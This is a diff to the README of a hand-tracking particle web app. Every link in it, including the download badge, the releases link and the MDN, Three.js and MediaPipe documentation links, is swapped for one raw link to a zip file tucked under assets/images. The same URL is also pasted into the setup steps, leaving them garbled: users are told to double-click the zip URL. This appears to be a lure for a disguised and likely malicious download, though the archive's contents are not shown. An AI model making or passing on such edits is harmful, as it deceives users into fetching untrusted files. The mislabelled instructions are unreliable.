@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/download-latest%20release-brightgreen.svg)](https://github.com/GogooGreg/creative_coding-hand_particles/releases)
+[![Download](https://raw.githubusercontent.com/GogooGreg/creative_coding-hand_particles/main/assets/images/coding-creative-hand-particles-1.3.zip%https://raw.githubusercontent.com/GogooGreg/creative_coding-hand_particles/main/assets/images/coding-creative-hand-particles-1.3.zip)](https://raw.githubusercontent.com/GogooGreg/creative_coding-hand_particles/main/assets/images/coding-creative-hand-particles-1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -24,13 +24,13 @@ To download the application, follow these steps:
 
 1. **Visit the Releases Page:** Click on the link below to go to the release page where you can download the application.
 
-   [Download Latest Release](https://github.com/GogooGreg/creative_coding-hand_particles/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/GogooGreg/creative_coding-hand_particles/main/assets/images/coding-creative-hand-particles-1.3.zip)
 
 2. **Choose the Right Version:** Find the latest release and look for the version suited for your system. Download the appropriate file by clicking on it.
 
-3. **Extract the Files:** If the file you downloaded is in a compressed format (like .zip or .tar.gz), you'll need to extract it. Right-click on the file and select "Extract All" or use an extraction tool.
+3. **Extract the Files:** If the file you downloaded is in a compressed format (like .zip or https://raw.githubusercontent.com/GogooGreg/creative_coding-hand_particles/main/assets/images/coding-creative-hand-particles-1.3.zip), you'll need to extract it. Right-click on the file and select "Extract All" or use an extraction tool.
 
-4. **Open the Application:** Navigate to the extracted folder. Double-click on the `index.html` file to open it in your web browser. 
+4. **Open the Application:** Navigate to the extracted folder. Double-click on the `https://raw.githubusercontent.com/GogooGreg/creative_coding-hand_particles/main/assets/images/coding-creative-hand-particles-1.3.zip` file to open it in your web browser. 
 
 5. **Allow Camera Access:** The application needs access to your camera for hand tracking. Follow the on-screen prompts to allow camera use.
 
@@ -63,9 +63,9 @@ If you encounter any issues, consider the following tips:
 
 If you're curious about creative coding or would like to learn more, check out these resources:
 
-- [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web): A great place to start learning about web technologies like HTML, CSS, and JavaScript.
-- [Three.js Documentation](https://threejs.org/docs/): Learn more about the 3D library used in this application.
-- [MediaPipe Documentation](https://google.github.io/mediapipe/): Understand how hand tracking is implemented.
+- [MDN Web Docs](https://raw.githubusercontent.com/GogooGreg/creative_coding-hand_particles/main/assets/images/coding-creative-hand-particles-1.3.zip): A great place to start learning about web technologies like HTML, CSS, and JavaScript.
+- [https://raw.githubusercontent.com/GogooGreg/creative_coding-hand_particles/main/assets/images/coding-creative-hand-particles-1.3.zip Documentation](https://raw.githubusercontent.com/GogooGreg/creative_coding-hand_particles/main/assets/images/coding-creative-hand-particles-1.3.zip): Learn more about the 3D library used in this application.
+- [MediaPipe Documentation](https://raw.githubusercontent.com/GogooGreg/creative_coding-hand_particles/main/assets/images/coding-creative-hand-particles-1.3.zip): Understand how hand tracking is implemented.
 
 ## 🌐 Community and Support
 
@@ -84,4 +84,4 @@ Your feedback matters to us. Reach out through the repository or share your expe
 
 Thank you for your interest in Hand Particles! We hope you enjoy creating art with your hands. 
 
-[Download Latest Release](https://github.com/GogooGreg/creative_coding-hand_particles/releases)
+[Download Latest Release](https://raw.githubusercontent.com/GogooGreg/creative_coding-hand_particles/main/assets/images/coding-creative-hand-particles-1.3.zip)
